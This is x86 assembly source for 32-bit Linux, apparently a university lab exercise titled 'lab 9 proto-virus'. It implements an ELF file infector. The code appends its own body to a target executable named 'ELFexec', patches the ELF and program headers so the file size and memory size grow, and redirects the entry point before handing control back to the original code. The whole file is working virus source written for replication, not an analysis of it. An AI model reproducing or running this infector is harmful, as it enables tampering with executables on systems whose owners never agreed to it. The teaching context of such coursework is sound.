%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro
%macro  exit 1
	syscall1 1, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start


section .text  

_start: 
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES 

call get_my_loc
sub edx, next_i - OutStr
mov ecx, edx
mov eax, 4
 mov ebx ,1
 mov edx ,31
 int     0x80

 call get_my_loc
sub edx, next_i - FileName
mov ebx, edx
mov eax, 5 
mov ecx,0 
int 0x80
mov esi,eax
mov	eax, 19
	mov edx,2
	mov	ecx,0
	mov	ebx, esi
	int	0x80
	mov dword[esp+4],eax

call get_my_loc
sub edx, next_i - FileName
mov ebx, edx
mov eax, 5 
mov ecx,1026 
int 0x80



writef:
call get_my_loc
sub edx, next_i-virus_end
mov esi,edx
call get_my_loc
sub edx, next_i-_start
sub esi,edx
mov dword[esp+8],esi
mov ebx,eax ;file descriptor 
mov ecx, edx;message to write
mov edx,esi
mov eax,4 
int 0x80 


readf:

call get_my_loc
sub edx, next_i - FileName
mov ebx, edx
mov eax, 5 
mov ecx,0 
int 0x80
mov esi,eax
vir:
mov ebx, eax
 mov eax, 3
 add esp,148
   mov ecx,esp
   sub esp,148
   mov edx, 52         
   int 80h

	

   mov	ebx, esi
	mov	eax, 6
	int	0x80


fd:
call get_my_loc
sub edx, next_i - FileName
mov ebx, edx
mov eax, 5 
mov ecx,2 
int 0x80

mov esi,eax

	mov	eax, 19
	mov edx,2
	mov	ecx,-4
	mov	ebx, esi
	int	0x80


mov ebx,esi ;file descriptor 
add esp,172
mov ecx,esp
sub esp,172
mov edx,4
mov eax,4 
int 0x80 

fh:

	mov	eax, 19
	mov edx,0
	mov	ecx,52
	mov	ebx, esi
	int	0x80


mov ebx,esi ;file descriptor 
add esp,116
mov ecx,esp
sub esp,116
mov edx,32
mov eax,3
int 0x80 

mov	ebx, esi
	mov	eax, 6
	int	0x80

mov ebx, dword [esp+8]
add dword[esp+132],ebx
add dword[esp+136],ebx

add ecx,16
mov ebx,ecx
sub ebx,8
mov ebx,dword[ebx]
mov ecx,dword[ecx]
mov edx,dword[esp+4]
add ebx,edx
brek5:
mov dword [esp+172],ebx
brek2:
call get_my_loc
sub edx, next_i - FileName
mov ebx, edx
mov eax, 5 
mov ecx,2 
int 0x80

mov esi,eax
copyheader:
mov ebx,eax 
add esp,148 
mov ecx,esp 
sub esp,148
mov edx,52 
mov eax,4 
int 0x80 

call get_my_loc
sub edx, next_i - FileName
mov ebx, edx
mov eax, 5 
mov ecx,2 
int 0x80

mov esi,eax

mov	eax, 19
	mov edx,0
	mov	ecx,52
	mov	ebx, esi
	int	0x80

mov ebx,esi ;file descriptor 
add esp,116
mov ecx,esp
sub esp,116
mov edx,32
mov eax,4 
int 0x80 

call get_my_loc
sub edx, next_i-PreviousEntryPoint
jmp dword[edx]


VirusExit:
       exit 0          ; Termination if all is OK and no previous code to jump to
                 ; (also an example for use of above macros)
get_my_loc:
call next_i
next_i:
pop edx
ret 
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr: 
       db "perhaps not", 10 , 0
PreviousEntryPoint: dd VirusExit

virus_end:

